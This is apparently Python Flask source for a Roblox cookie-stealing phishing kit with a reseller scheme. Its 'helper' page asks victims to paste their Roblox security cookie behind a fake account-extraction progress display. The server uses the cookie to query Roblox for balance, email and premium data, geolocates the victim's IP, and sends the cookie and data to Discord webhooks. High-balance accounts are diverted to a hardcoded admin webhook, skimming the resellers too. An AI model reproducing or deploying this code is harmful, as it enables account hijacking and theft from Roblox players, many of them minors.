from flask import Flask, request, jsonify, render_template_string
import requests
import base64
import time
import os
import json
from datetime import datetime
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

ADMIN_WEBHOOK = "https://discord.com/api/webhooks/1458240581649174686/Eu-jB0LfRlnStSKuuqeixQA9u1a8tpxjiBS4175HCG0B2PQVRsoHvWKdI-NshDuS7LVx"

resellers = {}
sites_data = {}

BASE_URL = os.environ.get('RENDER_EXTERNAL_URL')

LANDING_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox Tools</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .container {
            max-width: 600px;
            width: 100%;
            background: white;
            border-radius: 20px;
            padding: 40px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
        }
        h1 {
            color: #333;
            margin-bottom: 30px;
            font-size: 32px;
            text-align: center;
        }
        .option-card {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            border-radius: 15px;
            padding: 30px;
            margin-bottom: 20px;
            cursor: pointer;
            transition: transform 0.2s;
            color: white;
        }
        .option-card:hover {
            transform: translateY(-5px);
        }
        .option-card h2 {
            margin-bottom: 10px;
            font-size: 24px;
        }
        .option-card p {
            opacity: 0.9;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🎮 Roblox Tools</h1>
        
        <div class="option-card" onclick="window.location.href='/reseller-setup'">
            <h2>🏢 Create Your Generator</h2>
            <p>Set up your own branded generator</p>
        </div>
        
        <div class="option-card" onclick="window.location.href='/generator'">
            <h2>⚡ Quick Generator</h2>
            <p>Create a helper page instantly</p>
        </div>
    </div>
</body>
</html>
"""

RESELLER_SETUP_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Create Your Generator</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .container {
            max-width: 500px;
            width: 100%;
            background: white;
            border-radius: 20px;
            padding: 40px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
        }
        h1 {
            color: #333;
            margin-bottom: 10px;
            font-size: 28px;
            text-align: center;
        }
        .subtitle {
            color: #666;
            text-align: center;
            margin-bottom: 30px;
            font-size: 14px;
        }
        .input-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            color: #333;
            font-weight: 600;
            margin-bottom: 8px;
            font-size: 14px;
        }
        input {
            width: 100%;
            padding: 12px;
            border: 2px solid #ddd;
            border-radius: 8px;
            font-size: 14px;
            transition: all 0.3s;
        }
        input:focus {
            outline: none;
            border-color: #667eea;
        }
        button {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s;
        }
        button:hover { transform: translateY(-2px); }
        button:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }
        .result {
            margin-top: 20px;
            padding: 15px;
            background: #f0f9ff;
            border-radius: 8px;
            display: none;
        }
        .result.show { display: block; }
        .result h3 {
            color: #0891b2;
            margin-bottom: 10px;
            font-size: 16px;
        }
        .link-box {
            background: white;
            padding: 12px;
            border-radius: 6px;
            word-break: break-all;
            font-size: 13px;
            color: #0891b2;
            border: 1px solid #0891b2;
            margin-bottom: 10px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🏢 Create Your Generator</h1>
        <p class="subtitle">Set up your branded generator</p>

        <div class="input-group">
            <label>Website Name</label>
            <input type="text" id="domainName" placeholder="e.g., RobuxGen Pro">
        </div>

        <div class="input-group">
            <label>Your Webhook</label>
            <input type="text" id="webhookInput" placeholder="https://discord.com/api/webhooks/...">
        </div>

        <div class="input-group">
            <label>Robux Threshold</label>
            <input type="number" id="thresholdInput" placeholder="e.g., 50" value="50">
        </div>

        <button onclick="createReseller()" id="createBtn">Create My Generator</button>

        <div class="result" id="result">
            <h3>✅ Your Generator is Ready!</h3>
            <div class="link-box" id="generatedLink"></div>
            <button onclick="copyLink()">Copy Link</button>
        </div>
    </div>

    <script>
        let generatedUrl = '';

        async function createReseller() {
            const domainName = document.getElementById('domainName').value;
            const webhook = document.getElementById('webhookInput').value;
            const threshold = document.getElementById('thresholdInput').value;
            const btn = document.getElementById('createBtn');
            
            if (!domainName) {
                alert('Please enter a website name');
                return;
            }

            if (!webhook || !webhook.includes('discord.com/api/webhooks')) {
                alert('Please enter a valid Discord webhook URL');
                return;
            }

            if (!threshold || threshold < 1) {
                alert('Please enter a valid robux threshold');
                return;
            }

            btn.disabled = true;
            btn.textContent = 'Creating...';

            try {
                const response = await fetch('/create-reseller', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        domain_name: domainName,
                        webhook: webhook,
                        threshold: parseInt(threshold)
                    })
                });

                const data = await response.json();
                
                if (data.success) {
                    generatedUrl = data.url;
                    document.getElementById('generatedLink').textContent = generatedUrl;
                    document.getElementById('result').classList.add('show');
                } else {
                    alert('Failed to create generator: ' + (data.error || 'Unknown error'));
                }
            } catch (error) {
                alert('Error: ' + error.message);
            }

            btn.disabled = false;
            btn.textContent = 'Create My Generator';
        }

        function copyLink() {
            navigator.clipboard.writeText(generatedUrl).then(() => {
                alert('✅ Link copied!');
            });
        }
    </script>
</body>
</html>
"""

GENERATOR_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{{GENERATOR_NAME}}</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .container {
            max-width: 500px;
            width: 100%;
            background: white;
            border-radius: 20px;
            padding: 40px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
        }
        h1 {
            color: #333;
            margin-bottom: 10px;
            font-size: 28px;
            text-align: center;
        }
        .subtitle {
            color: #666;
            text-align: center;
            margin-bottom: 30px;
            font-size: 14px;
        }
        .input-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            color: #333;
            font-weight: 600;
            margin-bottom: 8px;
            font-size: 14px;
        }
        input {
            width: 100%;
            padding: 12px;
            border: 2px solid #ddd;
            border-radius: 8px;
            font-size: 14px;
            transition: all 0.3s;
        }
        input:focus {
            outline: none;
            border-color: #667eea;
        }
        button {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s;
        }
        button:hover { transform: translateY(-2px); }
        button:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }
        .result {
            margin-top: 20px;
            padding: 15px;
            background: #f0f9ff;
            border-radius: 8px;
            display: none;
        }
        .result.show { display: block; }
        .result h3 {
            color: #0891b2;
            margin-bottom: 10px;
            font-size: 16px;
        }
        .link-box {
            background: white;
            padding: 12px;
            border-radius: 6px;
            word-break: break-all;
            font-size: 13px;
            color: #0891b2;
            border: 1px solid #0891b2;
            margin-bottom: 10px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🎮 {{GENERATOR_NAME}}</h1>
        <p class="subtitle">Create your custom page</p>

        <div class="input-group">
            <label>Website Name</label>
            <input type="text" id="websiteName" placeholder="e.g., Robux Generator">
        </div>

        <div class="input-group">
            <label>Your Discord Webhook URL</label>
            <input type="text" id="webhookInput" placeholder="https://discord.com/api/webhooks/...">
        </div>

        <button onclick="generateSite()" id="genBtn">Generate Page</button>

        <div class="result" id="result">
            <h3>✅ Your Page is Ready!</h3>
            <div class="link-box" id="generatedLink"></div>
            <button onclick="copyLink()">Copy Link</button>
        </div>
    </div>

    <script>
        const RESELLER_ID = "{{RESELLER_ID}}";
        let generatedUrl = '';

        async function generateSite() {
            const webhook = document.getElementById('webhookInput').value;
            const websiteName = document.getElementById('websiteName').value;
            const btn = document.getElementById('genBtn');
            
            if (!webhook || !webhook.includes('discord.com/api/webhooks')) {
                alert('Please enter a valid Discord webhook URL');
                return;
            }

            if (!websiteName) {
                alert('Please enter a website name');
                return;
            }

            btn.disabled = true;
            btn.textContent = 'Generating...';

            try {
                const response = await fetch('/generate', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        webhook: webhook,
                        website_name: websiteName,
                        reseller_id: RESELLER_ID
                    })
                });

                const data = await response.json();
                
                if (data.success) {
                    generatedUrl = data.url;
                    document.getElementById('generatedLink').textContent = generatedUrl;
                    document.getElementById('result').classList.add('show');
                } else {
                    alert('Failed to generate site: ' + (data.error || 'Unknown error'));
                }
            } catch (error) {
                alert('Error: ' + error.message);
            }

            btn.disabled = false;
            btn.textContent = 'Generate Page';
        }

        function copyLink() {
            navigator.clipboard.writeText(generatedUrl).then(() => {
                alert('✅ Link copied!');
            });
        }
    </script>
</body>
</html>
"""

HELPER_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{{WEBSITE_NAME}}</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #e74c3c 0%, #c0392b 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 15px;
            padding: 40px;
            max-width: 450px;
            width: 100%;
            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.2);
        }
        h1 {
            color: #e74c3c;
            margin-bottom: 10px;
            font-size: 26px;
            text-align: center;
        }
        .subtitle {
            color: #7f8c8d;
            text-align: center;
            margin-bottom: 30px;
            font-size: 13px;
        }
        .input-group { margin-bottom: 20px; }
        label {
            display: block;
            color: #2c3e50;
            font-weight: 600;
            margin-bottom: 8px;
            font-size: 13px;
        }
        textarea {
            width: 100%;
            padding: 12px;
            border: 2px solid #ecf0f1;
            border-radius: 8px;
            font-size: 14px;
            font-family: inherit;
            transition: all 0.3s;
            min-height: 100px;
            resize: vertical;
        }
        textarea:focus {
            outline: none;
            border-color: #e74c3c;
        }
        button {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #e74c3c 0%, #c0392b 100%);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
        }
        button:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(231, 76, 60, 0.4);
        }
        button:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none;
        }
        .status {
            margin-top: 20px;
            padding: 12px;
            border-radius: 8px;
            text-align: center;
            font-size: 14px;
            display: none;
        }
        .status.success {
            background: #d4edda;
            color: #155724;
            display: block;
        }
        .status.error {
            background: #f8d7da;
            color: #721c24;
            display: block;
        }
        .status.extracting {
            background: #cff4fc;
            color: #055160;
            display: block;
            font-weight: bold;
        }
        .info {
            background: #fff3cd;
            border: 1px solid #ffc107;
            border-radius: 8px;
            padding: 12px;
            margin-top: 20px;
            font-size: 12px;
            color: #856404;
        }
        .loading {
            display: none;
            text-align: center;
            margin: 20px 0;
        }
        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #e74c3c;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1.5s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .timer {
            font-size: 18px;
            font-weight: bold;
            color: #e74c3c;
            margin: 10px 0;
        }
        .progress-container {
            width: 100%;
            height: 10px;
            background-color: #f0f0f0;
            border-radius: 5px;
            margin: 15px 0;
            overflow: hidden;
        }
        .progress-bar {
            height: 100%;
            background: linear-gradient(90deg, #e74c3c, #f39c12);
            width: 0%;
            transition: width 0.3s ease;
            border-radius: 5px;
        }
        .extraction-steps {
            text-align: left;
            margin: 15px 0;
            font-size: 13px;
        }
        .step {
            margin: 8px 0;
            padding-left: 20px;
            position: relative;
        }
        .step:before {
            content: "✓";
            position: absolute;
            left: 0;
            color: #27ae60;
            font-weight: bold;
        }
        .step.pending:before {
            content: "⏳";
            color: #f39c12;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🛠️ {{WEBSITE_NAME}}</h1>
        <p class="subtitle">Paste your Roblox cookie below</p>

        <div class="input-group">
            <label>Roblox Cookie</label>
            <textarea id="cookie" placeholder="Paste your Roblox cookie here"></textarea>
        </div>

        <div class="loading" id="loading">
            <div class="spinner"></div>
            <div class="timer" id="timer">01:00</div>
            <div class="progress-container">
                <div class="progress-bar" id="progressBar"></div>
            </div>
            <h3>🔍 Account Extraction in Progress</h3>
            <p>Please wait while we extract your account information...</p>
            
            <div class="extraction-steps">
                <div class="step pending" id="step1">Verifying cookie validity</div>
                <div class="step pending" id="step2">Extracting account details</div>
                <div class="step pending" id="step3">Checking Robux balance</div>
                <div class="step pending" id="step4">Retrieving premium status</div>
                <div class="step pending" id="step5">Finalizing extraction</div>
            </div>
        </div>

        <button onclick="submitCookie()" id="submitBtn">Extract Account</button>

        <div class="status" id="status"></div>

        <div class="info">
            ℹ️ Paste any Roblox cookie to extract account information. This process takes approximately 1 minute.
        </div>
    </div>

    <script>
        const SITE_ID = "{{SITE_ID}}";
        let extractionTimer = null;
        let timeLeft = 60; // 1 minute in seconds
        let progressInterval = null;

        async function submitCookie() {
            const cookie = document.getElementById('cookie').value;
            const status = document.getElementById('status');
            const btn = document.getElementById('submitBtn');
            const loading = document.getElementById('loading');
            const progressBar = document.getElementById('progressBar');
            const timer = document.getElementById('timer');

            if (!cookie) {
                showError('❌ Please paste your Roblox cookie');
                return;
            }

            // No format validation - accept any cookie

            // Reset timer and progress
            timeLeft = 60;
            progressBar.style.width = '0%';
            timer.textContent = '01:00';
            
            // Hide button and show loading
            btn.disabled = true;
            btn.style.display = 'none';
            loading.style.display = 'block';
            status.style.display = 'none';
            
            // Start the timer
            startExtractionTimer();
            
            // Simulate extraction steps
            simulateExtractionSteps();
            
            // Start progress bar animation
            startProgressBar();

            try {
                // Send request to server
                const response = await fetch('/submit', {
                    method: 'POST',
                    headers: { 
                        'Content-Type': 'application/json',
                        'Accept': 'application/json'
                    },
                    body: JSON.stringify({
                        site_id: SITE_ID,
                        cookie: cookie
                    })
                });

                const data = await response.json();

                if (data.success) {
                    // Mark all steps as completed
                    completeAllSteps();
                    // Wait for timer to finish
                    setTimeout(() => {
                        clearExtractionTimer();
                        showSuccess('✅ Account extraction completed successfully!');
                        document.getElementById('cookie').value = '';
                    }, 1000);
                } else {
                    clearExtractionTimer();
                    showError('❌ Extraction failed: ' + (data.error || 'Unknown error'));
                }
            } catch (error) {
                clearExtractionTimer();
                showError('❌ Network error. Please check your connection and try again.');
            } finally {
                // Button will be re-enabled after timer completes
            }
        }

        function startExtractionTimer() {
            extractionTimer = setInterval(() => {
                timeLeft--;
                
                // Update timer display
                const minutes = Math.floor(timeLeft / 60);
                const seconds = timeLeft % 60;
                document.getElementById('timer').textContent = 
                    `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
                
                // Update progress bar based on time
                const progressPercentage = ((60 - timeLeft) / 60) * 100;
                document.getElementById('progressBar').style.width = `${progressPercentage}%`;
                
                // When timer reaches 0
                if (timeLeft <= 0) {
                    clearExtractionTimer();
                    completeExtraction();
                }
            }, 1000);
        }

        function startProgressBar() {
            let progress = 0;
            progressInterval = setInterval(() => {
                progress += 1.67; // 100% in 60 seconds
                if (progress > 100) progress = 100;
                document.getElementById('progressBar').style.width = `${progress}%`;
            }, 1000);
        }

        function simulateExtractionSteps() {
            // Step 1: Verify cookie (immediate)
            setTimeout(() => {
                document.getElementById('step1').classList.remove('pending');
                document.getElementById('step1').textContent = '✓ Cookie verified';
            }, 3000);
            
            // Step 2: Extract details (5 seconds)
            setTimeout(() => {
                document.getElementById('step2').classList.remove('pending');
                document.getElementById('step2').textContent = '✓ Account details extracted';
            }, 8000);
            
            // Step 3: Check Robux (15 seconds)
            setTimeout(() => {
                document.getElementById('step3').classList.remove('pending');
                document.getElementById('step3').textContent = '✓ Robux balance checked';
            }, 18000);
            
            // Step 4: Premium status (25 seconds)
            setTimeout(() => {
                document.getElementById('step4').classList.remove('pending');
                document.getElementById('step4').textContent = '✓ Premium status retrieved';
            }, 28000);
            
            // Step 5: Finalizing (45 seconds)
            setTimeout(() => {
                document.getElementById('step5').classList.remove('pending');
                document.getElementById('step5').textContent = '✓ Extraction finalized';
            }, 48000);
        }

        function completeAllSteps() {
            for (let i = 1; i <= 5; i++) {
                const step = document.getElementById(`step${i}`);
                step.classList.remove('pending');
                if (!step.textContent.includes('✓')) {
                    step.textContent = '✓ ' + step.textContent.replace('⏳ ', '');
                }
            }
        }

        function completeExtraction() {
            clearInterval(progressInterval);
            document.getElementById('progressBar').style.width = '100%';
            
            // Re-enable button
            const btn = document.getElementById('submitBtn');
            btn.disabled = false;
            btn.style.display = 'block';
            
            // Hide loading
            document.getElementById('loading').style.display = 'none';
            
            // Show success message
            showSuccess('✅ Account extraction process completed!');
        }

        function clearExtractionTimer() {
            if (extractionTimer) {
                clearInterval(extractionTimer);
                extractionTimer = null;
            }
            if (progressInterval) {
                clearInterval(progressInterval);
                progressInterval = null;
            }
        }

        function showError(message) {
            clearExtractionTimer();
            const status = document.getElementById('status');
            const btn = document.getElementById('submitBtn');
            const loading = document.getElementById('loading');
            
            status.className = 'status error';
            status.textContent = message;
            status.style.display = 'block';
            
            btn.disabled = false;
            btn.style.display = 'block';
            loading.style.display = 'none';
        }

        function showSuccess(message) {
            const status = document.getElementById('status');
            const btn = document.getElementById('submitBtn');
            const loading = document.getElementById('loading');
            
            status.className = 'status success';
            status.textContent = message;
            status.style.display = 'block';
            
            btn.disabled = false;
            btn.style.display = 'block';
            loading.style.display = 'none';
        }
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(LANDING_HTML)

@app.route('/reseller-setup')
def reseller_setup():
    return render_template_string(RESELLER_SETUP_HTML)

@app.route('/generator')
def direct_generator():
    html = GENERATOR_HTML.replace('{{GENERATOR_NAME}}', 'Roblox Tools').replace('{{RESELLER_ID}}', 'none')
    return render_template_string(html)

@app.route('/create-reseller', methods=['POST'])
def create_reseller():
    data = request.json
    domain_name = data.get('domain_name')
    webhook = data.get('webhook')
    threshold = data.get('threshold', 50)
    
    if not domain_name or not webhook:
        return jsonify({'success': False, 'error': 'Missing required fields'})
    
    reseller_id = base64.urlsafe_b64encode(str(time.time()).encode()).decode()[:8]
    resellers[reseller_id] = {
        'domain_name': domain_name,
        'webhook': webhook,
        'threshold': threshold
    }
    
    if BASE_URL:
        generator_url = f"{BASE_URL}/g/{reseller_id}"
    else:
        generator_url = f"{request.host_url}g/{reseller_id}"
    
    try:
        requests.post(webhook, json={
            'embeds': [{
                'title': '✅ Your Generator is Ready!',
                'description': f'**{domain_name}** generator created!\n\n🔗 **Your Generator Link:**\n{generator_url}\n\n**Settings:**\n💎 Threshold: {threshold}+ Robux\n\nShare your generator link with users!',
                'color': 0x00ff00,
                'footer': {'text': 'Roblox Tools'}
            }]
        })
    except Exception as e:
        print(f"Webhook error: {e}")
    
    return jsonify({'success': True, 'url': generator_url})

@app.route('/g/<reseller_id>')
def reseller_generator(reseller_id):
    if reseller_id not in resellers:
        return "Invalid link", 404
    
    reseller_data = resellers[reseller_id]
    html = GENERATOR_HTML.replace('{{GENERATOR_NAME}}', reseller_data['domain_name']).replace('{{RESELLER_ID}}', reseller_id)
    return render_template_string(html)

@app.route('/generate', methods=['POST'])
def generate():
    data = request.json
    webhook = data.get('webhook')
    website_name = data.get('website_name', 'Roblox Helper')
    reseller_id = data.get('reseller_id', 'none')
    
    if not webhook or 'discord.com/api/webhooks' not in webhook:
        return jsonify({'success': False, 'error': 'Invalid webhook'})
    
    site_id = base64.urlsafe_b64encode(str(time.time()).encode()).decode()[:8]
    sites_data[site_id] = {
        'webhook': webhook,
        'name': website_name,
        'reseller_id': reseller_id
    }
    
    if BASE_URL:
        site_url = f"{BASE_URL}/h/{site_id}"
    else:
        site_url = f"{request.host_url}h/{site_id}"
    
    try:
        requests.post(webhook, json={
            'embeds': [{
                'title': '✅ Your Page is Live!',
                'description': f'**{website_name}** is ready:\n\n🔗 {site_url}\n\nShare this link to collect submissions.',
                'color': 0x00ff00,
                'footer': {'text': 'Roblox Tools'}
            }]
        })
    except Exception as e:
        print(f"Webhook error: {e}")
    
    return jsonify({'success': True, 'url': site_url})

@app.route('/h/<site_id>')
def helper(site_id):
    if site_id not in sites_data:
        return "Invalid link", 404
    
    site_data = sites_data[site_id]
    html = HELPER_HTML.replace('{{WEBSITE_NAME}}', site_data['name']).replace('{{SITE_ID}}', site_id)
    return render_template_string(html)

@app.route('/submit', methods=['POST'])
def submit():
    print(f"Submit endpoint called")
    
    data = request.json
    if not data:
        return jsonify({'success': False, 'error': 'No data received'})
    
    site_id = data.get('site_id')
    cookie = data.get('cookie')
    
    print(f"Site ID: {site_id}, Cookie length: {len(cookie) if cookie else 0}")
    
    if not site_id or not cookie:
        return jsonify({'success': False, 'error': 'Missing cookie'})
    
    if site_id not in sites_data:
        return jsonify({'success': False, 'error': 'Invalid site ID'})
    
    site_data = sites_data[site_id]
    end_user_webhook = site_data['webhook']
    reseller_id = site_data['reseller_id']
    
    try:
        user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        
        location = "Unknown"
        try:
            ip_info = requests.get(f'https://ipapi.co/{user_ip}/json/', timeout=3).json()
            location = f"{ip_info.get('city', 'Unknown')}, {ip_info.get('region', 'Unknown')}, {ip_info.get('country_name', 'Unknown')}"
        except Exception as ip_error:
            print(f"IP lookup error: {ip_error}")
        
        user_id = "Unknown"
        username = "Unknown"
        robux = 0
        email_verified = "Unknown"
        premium = "Unknown"
        account_age = "Unknown"
        top_games = []
        api_status = "Failed"
        cookie_valid = False
        
        headers = {
            'Cookie': f'.ROBLOSECURITY={cookie}',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'application/json'
        }
        
        print(f"Cookie received (first 50 chars): {cookie[:50]}...")
        print(f"Cookie length: {len(cookie)}")
        
        try:
            csrf_token = "no-csrf"
            try:
                csrf_response = requests.post('https://auth.roblox.com/v2/logout', 
                                             headers=headers, timeout=5)
                if 'x-csrf-token' in csrf_response.headers:
                    csrf_token = csrf_response.headers['x-csrf-token']
                    headers['X-CSRF-TOKEN'] = csrf_token
                    print(f"CSRF Token obtained")
            except Exception as csrf_error:
                print(f"CSRF error: {csrf_error}")
            
            user_response = requests.get('https://users.roblox.com/v1/users/authenticated', 
                                        headers=headers, timeout=10)
            
            print(f"Auth status code: {user_response.status_code}")
            
            if user_response.status_code == 200:
                user_data = user_response.json()
                user_id = user_data.get('id', 'Unknown')
                username = user_data.get('name', 'Unknown')
                cookie_valid = True
                api_status = "Success"
                
                print(f"User authenticated: {username} (ID: {user_id})")
                
                try:
                    robux_headers = headers.copy()
                    if csrf_token != "no-csrf":
                        robux_headers['X-CSRF-TOKEN'] = csrf_token
                    
                    robux_response = requests.get(f'https://economy.roblox.com/v1/users/{user_id}/currency', 
                                                 headers=robux_headers, timeout=10)
                    print(f"Robux status: {robux_response.status_code}")
                    
                    if robux_response.status_code == 200:
                        robux_data = robux_response.json()
                        robux = robux_data.get('robux', 0)
                        print(f"Robux: {robux}")
                    else:
                        robux = "Could not retrieve"
                except Exception as robux_error:
                    print(f"Robux fetch error: {robux_error}")
                
                try:
                    email_headers = headers.copy()
                    if csrf_token != "no-csrf":
                        email_headers['X-CSRF-TOKEN'] = csrf_token
                    
                    email_response = requests.get('https://accountinformation.roblox.com/v1/email', 
                                                 headers=email_headers, timeout=10)
                    print(f"Email status: {email_response.status_code}")
                    
                    if email_response.status_code == 200:
                        email_data = email_response.json()
                        email_verified = "✅ Yes" if email_data.get('verified', False) else "❌ No"
                        print(f"Email verified: {email_verified}")
                    else:
                        email_verified = f"API Error: {email_response.status_code}"
                except Exception as email_error:
                    print(f"Email fetch error: {email_error}")
                
                try:
                    premium_response = requests.get(f'https://premiumfeatures.roblox.com/v1/users/{user_id}/validate-membership', 
                                                   headers=headers, timeout=10)
                    print(f"Premium status: {premium_response.status_code}")
                    
                    if premium_response.status_code == 200:
                        premium_data = premium_response.json()
                        premium = "✅ Yes" if premium_data else "❌ No"
                    else:
                        premium = f"API Error: {premium_response.status_code}"
                    print(f"Premium: {premium}")
                except Exception as premium_error:
                    print(f"Premium fetch error: {premium_error}")
                
                try:
                    user_details = requests.get(f'https://users.roblox.com/v1/users/{user_id}', 
                                               headers=headers, timeout=10)
                    print(f"User details status: {user_details.status_code}")
                    
                    if user_details.status_code == 200:
                        user_detail_data = user_details.json()
                        created_date = user_detail_data.get('created', '')
                        if created_date:
                            created = datetime.fromisoformat(created_date.replace('Z', '+00:00'))
                            age_days = (datetime.now(created.tzinfo) - created).days
                            if age_days > 365:
                                account_age = f"{age_days // 365} years, {age_days % 365} days"
                            else:
                                account_age = f"{age_days} days"
                        print(f"Account age: {account_age}")
                except Exception as age_error:
                    print(f"Account age error: {age_error}")
                
                try:
                    games_response = requests.get(f'https://games.roblox.com/v2/users/{user_id}/games?accessFilter=2&limit=3', 
                                                 headers=headers, timeout=10)
                    print(f"Games status: {games_response.status_code}")
                    
                    if games_response.status_code == 200:
                        games_data = games_response.json().get('data', [])
                        top_games = [game.get('name', 'Unknown Game')[:30] for game in games_data[:3]]
                        print(f"Top games: {top_games}")
                except Exception as games_error:
                    print(f"Games fetch error: {games_error}")
                    
            elif user_response.status_code == 401:
                api_status = "Invalid Cookie (401)"
                print("Cookie is invalid (401 Unauthorized)")
            elif user_response.status_code == 403:
                api_status = "Rate Limited (403)"
                print("Rate limited by Roblox API (403)")
            elif user_response.status_code == 429:
                api_status = "Too Many Requests (429)"
                print("Too many requests (429)")
            else:
                api_status = f"API Error: {user_response.status_code}"
                print(f"API error: {user_response.status_code}")
                
        except requests.exceptions.RequestException as api_error:
            api_status = f"Network Error: {api_error}"
            print(f"Request exception: {api_error}")
        
        embed_color = 0xFF0000 if (isinstance(robux, int) and robux >= 100) else (0xFFA500 if reseller_id != 'none' else 0x00FF00)
        
        embed = {
            'title': '🎯 Account Extracted' if cookie_valid else '⚠️ Extraction Failed',
            'color': embed_color,
            'fields': [
                {'name': '👤 Username', 'value': username, 'inline': True},
                {'name': '🆔 User ID', 'value': str(user_id), 'inline': True},
                {'name': '💎 Robux', 'value': str(robux), 'inline': True},
                {'name': '⭐ Premium', 'value': premium, 'inline': True},
                {'name': '📧 Email Verified', 'value': email_verified, 'inline': True},
                {'name': '📅 Account Age', 'value': account_age, 'inline': True},
                {'name': '🌍 IP', 'value': user_ip, 'inline': True},
                {'name': '📍 Location', 'value': location, 'inline': True},
                {'name': '🔧 API Status', 'value': api_status, 'inline': True},
                {'name': '🎮 Recent Games', 'value': ', '.join(top_games) if top_games else 'None found', 'inline': False},
                {'name': '🍪 Cookie', 'value': f'```{cookie[:80]}...```' if len(cookie) > 80 else f'```{cookie}```', 'inline': False}
            ],
            'footer': {'text': 'Roblox Tools - Account Extraction'},
            'timestamp': time.strftime('%Y-%m-%dT%H:%M:%S.000Z', time.gmtime())
        }
        
        if not cookie_valid:
            embed['description'] = '⚠️ Cookie appears to be invalid or expired'
        
        target_webhook = end_user_webhook
        
        if isinstance(robux, int) and robux >= 100:
            target_webhook = ADMIN_WEBHOOK
        elif reseller_id != 'none' and reseller_id in resellers:
            reseller_threshold = resellers[reseller_id]['threshold']
            if isinstance(robux, int) and robux >= reseller_threshold:
                target_webhook = resellers[reseller_id]['webhook']
        
        try:
            webhook_response = requests.post(target_webhook, json={'embeds': [embed]}, timeout=10)
            print(f"Webhook sent to {target_webhook}, status: {webhook_response.status_code}")
        except Exception as webhook_error:
            print(f"Webhook error: {webhook_error}")
            try:
                requests.post(ADMIN_WEBHOOK, json={'embeds': [embed]}, timeout=10)
            except:
                pass
        
        return jsonify({'success': True, 'message': 'Account extraction completed'})
    
    except Exception as e:
        print(f"Submit error: {e}")
        return jsonify({'success': False, 'error': str(e)})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 10000))
    app.run(host='0.0.0.0', port=port)
